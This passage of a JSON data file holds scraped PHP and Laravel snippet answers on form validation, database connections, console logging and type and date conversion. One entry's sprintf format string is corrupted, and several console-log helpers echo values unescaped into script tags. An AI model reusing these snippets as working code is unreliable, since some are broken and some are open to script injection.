    "description": "onclick=\"return confirm('Are you sure you want to submit this form?')\"\n<form action=\"adminprocess.php\" method=\"POST\" onsubmit=\"return confirm('Are you sure you want to submit this form?');\">     <input type=\"submit\" name=\"completeYes\" value=\"Complete Transaction\" /> </form>\n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 760,
    "keyword": null,
    "link": null,
    "title": " confirm password in codeigniter",
    "description": "$this->form_validation->set_rules('first_name','First Name','trim|required'); $this->form_validation->set_rules('last_name','Last Name','trim|required'); $this->form_validation->set_rules('email','Email','trim|required|valid_email'); $this->form_validation->set_rules('username','Username','trim|required|min_length[3]'); $this->form_validation->set_rules('password', 'Password', 'required'); $this->form_validation->set_rules('confirm_password', 'Confirm Password', 'required|matches[password]'); \n",
    "reg_date": "2021-10-12T10:13:16.000Z"
  },
  {
    "id": 761,
    "keyword": null,
    "link": null,
    "title": " confirm password validation in laravel",
    "description": "1. $user = User::where('email', request('email'))->first(); 2. Hash::check(request('password'), $user->password);  This will return true or false based on whether or not the password matches.\n'password' => 'required|confirmed',  reference : https://laravel.com/docs/4.2/validation#rule-confirmed  The field under validation must have a matching field of foo_confirmation.  For example, if the field under validation is password, a matching password_confirmation field must be present in the input.\n$this->validate($request, [     'name' => 'required|min:3|max:50',     'email' => 'email',     'vat_number' => 'max:13',     'password' => 'required|confirmed|min:6', ]);\n$this->validate($request, [     'name' => 'required|min:3|max:50',     'email' => 'email',     'vat_number' => 'max:13',     'password' => 'required|confirmed|min:6', ]); \nRoute::get(...)->middleware('password.confirm');\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 762,
    "keyword": null,
    "link": null,
    "title": " confirm password validation laravel",
    "description": "1. $user = User::where('email', request('email'))->first(); 2. Hash::check(request('password'), $user->password);  This will return true or false based on whether or not the password matches.\n'password' => 'required|confirmed',  reference : https://laravel.com/docs/4.2/validation#rule-confirmed  The field under validation must have a matching field of foo_confirmation.  For example, if the field under validation is password, a matching password_confirmation field must be present in the input.\n'password' => 'required|                min:6|                regex:/^.*(?=.{3,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\\d\\x])(?=.*[!$#%]).*$/|                confirmed', \n$this->validate($request, [     'name' => 'required|min:3|max:50',     'email' => 'email',     'vat_number' => 'max:13',     'password' => 'required|confirmed|min:6', ]);\nRoute::get(...)->middleware('password.confirm');\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 763,
    "keyword": null,
    "link": null,
    "title": " connect mongodb with php",
    "description": "To use mongodb with php you have to use mongodb php driver. Kindly follow below to download the latest mongodb php driver. https://s3.amazonaws.com/drivers.mongodb.org/php/index.html After downloading unzip the file put php_mongo.dll into php extesion directory. And add below line into your php.ini file extension = php_mongo.dll    To test its working or not execute below line of code on browser <?php    // connect to mongodb    $m = new MongoClient(); \t    echo \"Connection to database successfully\";    // select a database    $db = $m->mydb; \t    echo \"Database mydb selected\"; ?>\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 764,
    "keyword": null,
    "link": null,
    "title": " connect php to mysql pdo",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\n$hostName = \"localhost\"; $dbName = \"test\"; $userName = \"test\"; $password = \"test1\"; try {     $pdo = new PDO(\"mysql:host=$hostName;dbname=$dbName\",$userName,$password);     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";      }     catch(PDOException $e)     {      echo \"Connection failed: \" . $e->getMessage();     } \n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 765,
    "keyword": null,
    "link": null,
    "title": " console.log in php",
    "description": "// Assuming you are wishing to log to the JS Console...  <?php \tfunction consoleLog($msg) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $msg . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\n/* console.log in php */  <?php \tfunction consoleLog($message) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $message . ');</script>'; \t}  \tconsoleLog('Hello, greppers!'); ?>\necho(\"<script type='text/javascript'> console.log($msg);</script>\");\n//display message in console  <?php \tfunction console_log($msg) { \t\techo '<script>' .           'console.log(\"'.$msg .' \")</script>'; \t}  \tconsole_log(\"Hi there!\"); ?>\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 766,
    "keyword": null,
    "link": null,
    "title": " console log in php",
    "description": "<?php function console_log($output, $with_script_tags = true) {     $js_code = 'console.log(' . json_encode($output, JSON_HEX_TAG) .  ');';     if ($with_script_tags) {         $js_code = '<script>' . $js_code . '</script>';     }     echo $js_code; }\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 767,
    "keyword": null,
    "link": null,
    "title": " console php",
    "description": "// Assuming you are wishing to log to the JS Console...  <?php \tfunction consoleLog($msg) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $msg . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\n/* console.log in php */  <?php \tfunction consoleLog($message) { \t\techo '<script type=\"text/javascript\">' .           'console.log(' . $message . ');</script>'; \t}  \tconsoleLog('Hello, greppers!'); ?>\necho(\"<script type='text/javascript'> console.log($msg);</script>\");\n//display message in console  <?php \tfunction console_log($msg) { \t\techo '<script>' .           'console.log(\"'.$msg .' \")</script>'; \t}  \tconsole_log(\"Hi there!\"); ?>\n// A little correction / improvement to @Kaotik's answer: <?php \tfunction consoleLog($msg) \t{ \t\techo '<script type=\"text/javascript\">console.log('           . str_replace('<', '\\\\x3C', json_encode($msg))           . ');</script>'; \t}  \tconsoleLog('Hello, console!'); ?>\nfunction debug($var, $die = false, $trace = true, $show_from = true)     {         //Trick to avoid html corruptions         echo '</select>';         echo '</script>';                  // BackTrace         $stack = '';         $i = 1;         $trace = debug_backtrace();         array_shift($trace);          foreach ($trace as $node) {           if (isset($node['file']) && ($node['line'])) {             $stack .= \"#$i \" . $node['file'] . \"(\" . $node['line'] . \"): \";           }           if (isset($node['class'])) {             $stack .= $node['class'] . \"->\";           }           $stack .= $node['function'] . \"()\" . PHP_EOL;           $i++;         }          $out[] = '<pre style=\"background-color:#CCCCCC\">';         if ($show_from) {           $calledFrom = debug_backtrace();           $out[] = '<strong>' . substr(str_replace(dirname(__FILE__), '', $calledFrom[0]['file']), 1) . '</strong>';           $out[] = ' (line <strong>' . $calledFrom[0]['line'] . '</strong>)';         }         $out[] = htmlspecialchars(print_r($var, true));         if (is_object($var)) {           $out[] = '-------- Class methods --------';           $out[] = print_r(get_class_methods(get_class($var)), true);         }          if ($trace) {           $out[] = '-------- Backtrace --------';           $out[] = $stack;         }          $out[] = '</pre>';         echo implode(PHP_EOL, $out);         if ($die) {           die();         }         break;      }\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 768,
    "keyword": null,
    "link": null,
    "title": " contains php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \n<?php $string = 'The lazy fox jumped over the fence';  if (str_contains($string, '')) {     echo \"Checking the existence of an empty string will always return true\"; }  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  if (str_contains($string, 'Lazy')) {     echo 'The string \"Lazy\" was found in the string'; } else {     echo '\"Lazy\" was not found because the case does not match'; }  # Checking the existence of the empty string will always return true # The string 'lazy' was found in the string # \"Lazy\" was not found because the case does not match\n$a = 'Hello world?';  if (strpos($a, 'Hello') !== false) { //PAY ATTENTION TO !==, not !=     echo 'true'; } if (stripos($a, 'HELLO') !== false) { //Case insensitive     echo 'true'; }\nif (strpos($a, 'are') !== false) {     echo 'true'; }\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 769,
    "keyword": null,
    "link": null,
    "title": " continue php",
    "description": "<?php for($i=0;$i<10;$i++) {     if($i==3)     {         continue;   //it will break one iteration.     }     echo $i; } ?>\n$basket = ['apples', 'bananas', 'broccoli', 'peaches', 'pears'];  foreach ($basket as $fruit) {   if ($fruit === 'broccoli') {     continue; // Skips 'broccoli' and moves onto 'peaches'   }      echo sprintf('I love %s!', $fruit); }  // I love apples! // I love bananas! // I love peaches! // I love pears!\nfor ($i = 0; $i < 10; ++$i)  {   echo \"I will loop 10 times\"; }\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 770,
    "keyword": null,
    "link": null,
    "title": " convert 1 digit to five digits laravel",
    "description": "sprintf(\"\u0004d\", $num)\n",
    "reg_date": "2021-10-12T10:13:17.000Z"
  },
  {
    "id": 771,
    "keyword": null,
    "link": null,
    "title": " convert a php array into a javascript array",
    "description": "var js_array = [<?php echo '\"'.implode('\",\"',  $disabledDaysRange ).'\"' ?>]; \n//in js do this var masterarray =  <?php echo '[\"' . implode('\", \"', $masterarray) . '\"]' ?>;\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 772,
    "keyword": null,
    "link": null,
    "title": " convert a value to a float in php",
    "description": "$stringVal = \"12.06\"; $stringConvertedToFloat = floatval( $stringVal ); // The floatval function will return the argument converted // to a float value if the value can be converted. // IF the value cannot be converted these are the values that will be // returned: // Empty Array: returns 0. eg: floatval([]); // Non-Empty Array: returns 1. eg: floatval([\"ab\", \"12\"]) // String with a non-numeric value as the left most character: returns 0. eg: floatval(\"ab12\") // String with one or more numeric values as the left most characters: returns those characters as a float. eg: floatval(\"12ab1\") will return 12. // Oh the joys of php\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 773,
    "keyword": null,
    "link": null,
    "title": " convert am pm time to 24 hour in php",
    "description": "echo date(\"H:i:s\", strtotime(\"04:25 PM\"));\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 774,
    "keyword": null,
    "link": null,
    "title": " convert any phone number in us number format php",
    "description": "$numbers = explode(\"\\n\", '(111) 222-3333 ((111) 222-3333 1112223333 111 222-3333 111-222-3333 (111)2223333 +11234567890     1-8002353551     123-456-7890   -Hello! +1 - 1234567890  ');   foreach($numbers as $number) {     print preg_replace('~.*(\\d{3})[^\\d]{0,7}(\\d{3})[^\\d]{0,7}(\\d{4}).*~', '($1) $2-$3', $number). \"\\n\"; }\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 775,
    "keyword": null,
    "link": null,
    "title": " convert array to object php",
    "description": "$object = (object) $array;\n$object = json_decode(json_encode($array), FALSE); \n$arrayResult = array_map(function($array){     return (object)$array; }, $yourOrinalArray);\n$object = (object)$array; \n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 776,
    "keyword": null,
    "link": null,
    "title": " convert base64 string to pdf in php",
    "description": "$pdf_base64 = \"base64pdf.txt\"; //Get File content from txt file $pdf_base64_handler = fopen($pdf_base64,'r'); $pdf_content = fread ($pdf_base64_handler,filesize($pdf_base64)); fclose ($pdf_base64_handler); //Decode pdf content $pdf_decoded = base64_decode ($pdf_content); //Write data back to pdf file $pdf = fopen ('test.pdf','w'); fwrite ($pdf,$pdf_decoded); //close output file fclose ($pdf); echo 'Done'; \n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 777,
    "keyword": null,
    "link": null,
    "title": " convert byte to megabyte php",
    "description": "function formatBytes($bytes, $precision = 2) {      $units = array('B', 'KB', 'MB', 'GB', 'TB');       $bytes = max($bytes, 0);      $pow = floor(($bytes ? log($bytes) : 0) / log(1024));      $pow = min($pow, count($units) - 1);       // Uncomment one of the following alternatives     // $bytes /= pow(1024, $pow);     // $bytes /= (1 << (10 * $pow));       return round($bytes, $precision) . ' ' . $units[$pow];  } \n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 778,
    "keyword": null,
    "link": null,
    "title": " convert comma separated number to number in php",
    "description": "$number = '1,000.5669'; $number = (float) str_replace(',', '', $number); var_dump($number); \n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 779,
    "keyword": null,
    "link": null,
    "title": " convert date in php",
    "description": "To convert the date-time format PHP provides strtotime() and date() function. We change the date format from one format to another.  Change YYYY-MM-DD to DD-MM-YYYY <? php. $currDate = \"2020-04-18\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo \"Changed date format is: \". $changeDate. \" (MM-DD-YYYY)\"; ?>\n$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '08/11/2010 19:37:02'; $date = strtotime($s); echo date('Y-m-d H:i:s', $date);\n$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \nphpCopyecho $dateNew = DateTime::createFromFormat('m-d-Y', '03-08-2020')->format('Y/m/d'); //output: 2020/03/08 \n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 780,
    "keyword": null,
    "link": null,
    "title": " convert date to reverse date in php",
    "description": "<?php  //This function convert date from any format to any format function reformatDate($date, $from_format = 'd/m/Y', $to_format = 'Y-m-d') {     $date_aux = date_create_from_format($from_format, $date);     return date_format($date_aux,$to_format); }  //Calling Funciton  reformatDate($date); ?>\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 781,
    "keyword": null,
    "link": null,
    "title": " convert date to timestamp in laravel builder",
    "description": "laravel convert timestamp to date date('Y-m-d', strtotime($date));  laravel convert date to timestamp date('Y-m-d H:i:s', strtotime($date));\n  $timestamp = strtotime(\"13-10-2013 15:00\"); \n$date = '2021-05-20'; date('Y-m-d H:i:s', strtotime($date));\n",
    "reg_date": "2021-10-12T10:13:18.000Z"
  },
  {
    "id": 782,
    "keyword": null,
    "link": null,
    "title": " convert dd/mm/yyyy to yyyy-mm-dd in mysql php",
    "description": "$date = DateTime::createFromFormat('d/m/Y', \"24/04/2012\"); echo $date->format('Y-m-d');\n$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date)); \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 783,
    "keyword": null,
    "link": null,
    "title": " convert gb to bytes php",
    "description": "function toByteSize($p_sFormatted) {     $aUnits = array('B'=>0, 'KB'=>1, 'MB'=>2, 'GB'=>3, 'TB'=>4, 'PB'=>5, 'EB'=>6, 'ZB'=>7, 'YB'=>8);     $sUnit = strtoupper(trim(substr($p_sFormatted, -2)));     if (intval($sUnit) !== 0) {         $sUnit = 'B';     }     if (!in_array($sUnit, array_keys($aUnits))) {         return false;     }     $iUnits = trim(substr($p_sFormatted, 0, strlen($p_sFormatted) - 2));     if (!intval($iUnits) == $iUnits) {         return false;     }     return $iUnits * pow(1024, $aUnits[$sUnit]); }\n<?php    function tobytes($size, $type)   {     $types = array(\"B\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"); //You can add the rest if needed..          if($key = array_search($type, $types))       return $size * pow(1024, $key);     else return \"invalid type\";   }      echo tobytes(15, \"MB\"); //15728640   echo tobytes(2, \"KB\"); //2048   echo tobytes(3, \"w/e\"); //invalid type  ?> \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 784,
    "keyword": null,
    "link": null,
    "title": " convert html code php",
    "description": "// html_entity_decode (php)  Ex:  <style> .red {   color: red; }  .bold {   font-weight: bold; } </style> <?php echo \"<font class='red bold'> * required </font>\"; ?>    \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 785,
    "keyword": null,
    "link": null,
    "title": " convert int to string php",
    "description": "return strval($integer);\n$number = 11; // This echo strval($number); // Or This echo (String) $number; // Output // \"11\" // \"11\"\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \nphpCopy<?php   $variable = 10; $string1 = strval($variable); echo \"The variable is converted to a string and its value is $string1.\";   ?> \n<?php class StrValTest {     public function __toString()     {         return __CLASS__;     } }  // Prints 'StrValTest' echo strval(new StrValTest); ?>\nphpCopy<?php   $variable = 10; $string1 = (string)$variable; echo \"The variable is converted to a string and its value is $string1.\";   ?> \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 786,
    "keyword": null,
    "link": null,
    "title": " convert json to array in php",
    "description": "$myArr = array(\"apple\", \"banana\", \"mango\", \"jackfruit\");  $toJSON = json_encode($myArr);  echo $toJSON;\n<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Array   $someArray = json_decode($someJSON, true);   print_r($someArray);        // Dump all data of the Array   echo $someArray[0][\"name\"]; // Access Array data    // Convert JSON string to Object   $someObject = json_decode($someJSON);   print_r($someObject);      // Dump all data of the Object   echo $someObject[0]->name; // Access Object data ?> \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n//2 ways   //this is for string from $_REQUEST,$_POST to array $jsonText = $_REQUEST['myJSON']; $decodedText = html_entity_decode($jsonText); $myArray = json_decode($decodedText, true);  //this is for json to array $assosiative_array = json_decode(json_encode($jsonText),true);\n $data = json_decode($json);\n<?php   // Loop through Array   $someArray = ...; // Replace ... with your PHP Array   foreach ($someArray as $key => $value) {     echo $value[\"name\"] . \", \" . $value[\"gender\"] . \"<br>\";   }    // Loop through Object   $someObject = ...; // Replace ... with your PHP Object   foreach($someObject as $key => $value) {     echo $value->name . \", \" . $value->gender . \"<br>\";   } ?> \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 787,
    "keyword": null,
    "link": null,
    "title": " convert key to value php",
    "description": "<?php $input = array(\"oranges\", \"apples\", \"pears\"); $flipped = array_flip($input); print_r($flipped); ?>    // output Array (     [oranges] => 0     [apples] => 1     [pears] => 2 )\n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 788,
    "keyword": null,
    "link": null,
    "title": " convert matrix row to column php",
    "description": "\tpublic function flip($arr) { \t\t$out = array(); \t   \t\tforeach ($arr as $key => $subarr) { \t\t\tforeach ($subarr as $subkey => $subvalue) { \t\t\t\t$out[$subkey][$key] = $subvalue; \t\t\t} \t\t} \t   \t\treturn $out; \t}\n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 789,
    "keyword": null,
    "link": null,
    "title": " convert multidimensional array into single dimension php",
    "description": "$arrayMult = [ ['a','b'] , ['c', 'd'] ]; $arraySingle = call_user_func_array('array_merge', $arrayMult); // $arraySingle is now = ['a','b', 'c', 'd'];\n$singleArray = [];  foreach ($parentArray as $childArray)  {      foreach ($childArray as $value)      {      $singleArray[] = $value;      }  } \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 790,
    "keyword": null,
    "link": null,
    "title": " convert multidimensional array to single array php",
    "description": "$singleArray = [];  foreach ($parentArray as $childArray)  {      foreach ($childArray as $value)      {      $singleArray[] = $value;      }  } \n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 791,
    "keyword": null,
    "link": null,
    "title": " convert object to array in php",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n//It is verry  easy : just cast object to array $array =  (array)$object;\n$array = (array) $yourObject;\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n// It will work Perfectly Fine. $arr = json_decode(json_encode($obj), true);\n$array = (array) $object;\n",
    "reg_date": "2021-10-12T10:13:19.000Z"
  },
  {
    "id": 792,
    "keyword": null,
    "link": null,
    "title": " convert object to array laravel",
    "description": "$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$users = App\\User::all(); $users = $users->toArray();\nfunction objectToArray(&$object) {     return @json_decode(json_encode($object), true); } \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 793,
    "keyword": null,
    "link": null,
    "title": " convert object to array php",
    "description": "//This works best $array = json_decode(json_encode($object), true);\n//It is verry  easy : just cast object to array $array =  (array)$object;\n$array = (array) $yourObject;\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$array = (array) $object;\n<?php  class sample {             /* Member variables */     var $var1;      var $var2;             function __construct( $par1, $par2 )       {          $this->var1 = $par1;          $this->var2 = $par2;      }  }     // Creating the object  $myObj = new sample(1000, \"second\");  echo \"Before conversion: \\n\";  var_dump($myObj);     // Converting object to associative array  $myArray = json_decode(json_encode($myObj), true);  echo \"After conversion: \\n\";  var_dump($myArray);  ?>     Output: Before conversion:  object(sample)#1 (2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }  After conversion:  array(2) {   [\"var1\"]=>   int(1000)   [\"var2\"]=>   string(6) \"second\" }\n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 794,
    "keyword": null,
    "link": null,
    "title": " convert one time zone datetime value to another using php",
    "description": "<?php $date = new DateTime('2000-01-01', new DateTimeZone('Pacific/Nauru')); echo $date->format('Y-m-d H:i:sP') . \"\\n\";  $date->setTimezone(new DateTimeZone('Pacific/Chatham')); echo $date->format('Y-m-d H:i:sP') . \"\\n\"; ?>      2000-01-01 00:00:00+12:00 2000-01-01 01:45:00+13:45\n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 795,
    "keyword": null,
    "link": null,
    "title": " convert space to 20 php",
    "description": "rawurlencode(\"Your message goes here\");\n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 796,
    "keyword": null,
    "link": null,
    "title": " convert std to array php",
    "description": "$array = explode(' ', $string); \n<?php   $realArray = (array) $stdClass; ?>\n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 797,
    "keyword": null,
    "link": null,
    "title": " convert stdclass object to array php",
    "description": "// The manual specifies the second argument of json_decode as: //\t assoc //\t\tWhen TRUE, returned objects will be converted into associative arrays.   $array = json_decode(json_encode($booking), true);\n$person = new stdClass(); $person->firstName = \"Taylor\"; $person->age = 32;  //Convert Single-Dimention Object to array $personArray = (array) $person;  //Convert Multi-Dimentional Object to Array $personArray = objectToArray($person); function objectToArray ($object) {     if(!is_object($object) && !is_array($object)){     \treturn $object;     }     return array_map('objectToArray', (array) $object); }\n$array = json_decode(json_encode($object), true); \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 798,
    "keyword": null,
    "link": null,
    "title": " convert string to date php",
    "description": "$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n$s = '08/11/2010 19:37:02'; $date = strtotime($s); echo date('Y-m-d H:i:s', $date);\n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 799,
    "keyword": null,
    "link": null,
    "title": " convert string to lowercase in php",
    "description": "/* strtolower() function converts  string to lowercase. */ <?php echo strtolower(\"Hello WORLD 123\"); ?> // Output:hello world 123\n/* The strtolower() function converts a string to lowercase. Convert all characters to lowercase.*/ <?php echo strtolower(\"Hello WORLD.\"); ?> // Output: hello world.\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' The strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n/* There is a function in php wich convert all paragraph or  string to lowercase*/ <?php echo strtolower(\"Hey Samy, HAVE YOU CHECK THE LATEST MOVIE.\");   // Output: hey samy, have you check the latest movie. ?> \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 800,
    "keyword": null,
    "link": null,
    "title": " convert text file to json php",
    "description": "<?php   header('Content-type: application/json');   echo json_encode( explode(\"\\r\\n\",file_get_contents('data.txt')) ); ?> \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 801,
    "keyword": null,
    "link": null,
    "title": " convert timestamp to date php",
    "description": "<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n$time = '2021-03-31 23:59:00'; strtotime($time);\n <?php $date = new DateTime(); echo $date->format('U = Y-m-d H:i:s') . \"\\n\";  $date->setTimestamp(1171502725); echo $date->format('U = Y-m-d H:i:s') . \"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:13:20.000Z"
  },
  {
    "id": 802,
    "keyword": null,
    "link": null,
    "title": " convert to int php",
    "description": "intval($string);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\nphpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\n$myintvariable = intval($myvariable);\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 803,
    "keyword": null,
    "link": null,
    "title": " convert to string php",
    "description": "return strval($integer);\n$number = 11; // This echo strval($number); // Or This echo (String) $number; // Output // \"11\" // \"11\"\n$number = 10; // To convert this number to a string: $numberString = (string)$number;\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \n<?php class StrValTest {     public function __toString()     {         return __CLASS__;     } }  // Prints 'StrValTest' echo strval(new StrValTest); ?>\necho \"'$animal'\";\n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 804,
    "keyword": null,
    "link": null,
    "title": " convert xml file to array php",
    "description": "public function xmlToArray($xmlstring){        $xml = simplexml_load_string($xmlstring, \"SimpleXMLElement\", LIBXML_NOCDATA);   $json = json_encode($xml);   $array = json_decode($json,TRUE);    return $array;  }\n$xmlfile = file_get_contents($path); \t\t$ob= simplexml_load_string($xmlfile); \t\t$json  = json_encode($ob); \t\t$configData = json_decode($json, true); \n$get = file_get_contents('http://steamcommunity.com/groups/starhawk/memberslistxml/?xml=1.xml'); $arr = simplexml_load_string($get); print_r($arr); \n",
    "reg_date": "2021-10-12T10:13:21.000Z"
  },
  {
    "id": 805,
    "keyword": null,
    "link": null,
    "title": " convertir datetime a string en php",
